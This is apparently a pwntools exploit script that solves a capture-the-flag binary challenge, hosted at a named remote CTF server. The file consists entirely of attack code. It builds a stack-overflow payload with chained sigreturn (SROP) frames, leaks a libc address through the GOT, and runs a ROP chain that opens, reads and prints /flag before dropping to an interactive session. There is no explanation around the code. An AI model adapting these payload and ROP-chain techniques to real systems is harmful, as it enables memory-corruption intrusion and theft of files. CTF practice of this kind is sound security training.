from pwn import *
import sys
remote_addr = ["nepctf.1cepeak.cn", 32633]
libc = ELF('./libc.so.6')
elf = ELF('./pwn')
if len(sys.argv) == 1:
    context.log_level="debug" 
    #p = process(["qemu-aarch64", "-L", "/usr/aarch64-linux-gnu/", "-g","1234","./stack"]) 
    #p = process(["qemu-aarch64", "-L", ".", "./stack"]) 
    p = process("./pwn_patched")
    context(arch='amd64', os='linux')
    context.terminal = ['tmux', 'splitw', '-h']
if len(sys.argv) == 2 :
    if 'r' in sys.argv[1]:
        p = remote(remote_addr[0],remote_addr[1])
    if 'n' not in sys.argv[1]:
        context.log_level="debug" 
        context(arch = 'amd64', os = 'linux')
r = lambda : p.recv()
rl = lambda : p.recvline()
rc = lambda x: p.recv(x)
ru = lambda x: p.recvuntil(x)
rud = lambda x: p.recvuntil(x, drop=True)
s = lambda x: p.send(x)
sl = lambda x: p.sendline(x)
sa = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
shell = lambda : p.interactive()
pr = lambda name,x : log.info(name+':'+hex(x))

DEBUG = 0

def debug(bp = None):
    if DEBUG == 1:
        if bp != None:
            gdb.attach(p, bp)
        else:
            gdb.attach(p)

debug()
syscall = elf.plt['syscall']
syscall_got = elf.got['syscall']
mov_rax_0xf = 0x400750
main = 0x40075b
sigframe = SigreturnFrame()
sigframe.rdi = 0
sigframe.rsi = 0
sigframe.rdx = 0x601100
sigframe.rcx = 0x300
sigframe.rbp = 0x601900
sigframe.rsp = 0x601100
sigframe.rip = syscall

pop_rdi = 0x400813

payload = b'a' * (0x30 + 8) + p64(pop_rdi) + p64(0xf) + p64(syscall) + bytes(sigframe)
sa(b'2023!', payload)

sigframe2 = SigreturnFrame()
sigframe2.rdi = 1
sigframe2.rsi = 1
sigframe2.rdx = syscall_got
sigframe2.rcx = 0x8
sigframe2.rbp = 0x601900
sigframe2.rsp = 0x601210
sigframe2.rip = syscall

pause()
payload = p64(pop_rdi) + p64(0xf) + p64(syscall) + bytes(sigframe2) + p64(pop_rdi) + p64(0xf) + p64(syscall) + bytes(sigframe) + b'/flag\x00'
sl(payload)

libc.address = u64(ru(b'\x7f')[-6:].ljust(8, b'\x00')) - libc.sym['syscall']
pr('libc.address', libc.address)

pop_rsi = libc.address + 0x23a6a
pop_rdx = libc.address + 0x1b96
pop_rax = libc.address + 0x1b500
syscall = libc.address + 0xd2625

pause()
payload = p64(pop_rdi) + p64(0x601320) + p64(pop_rsi) + p64(0) + p64(pop_rax) + p64(2) + p64(syscall)
payload += p64(pop_rdi) + p64(3) + p64(pop_rsi) + p64(0x601a00) + p64(pop_rdx) + p64(0x40) + p64(pop_rax) + p64(0) + p64(syscall)
payload += p64(pop_rdi) + p64(1) + p64(pop_rsi) + p64(0x601a00) + p64(pop_rdx) + p64(0x40) + p64(pop_rax) + p64(1) + p64(syscall)
sl(payload)

shell()
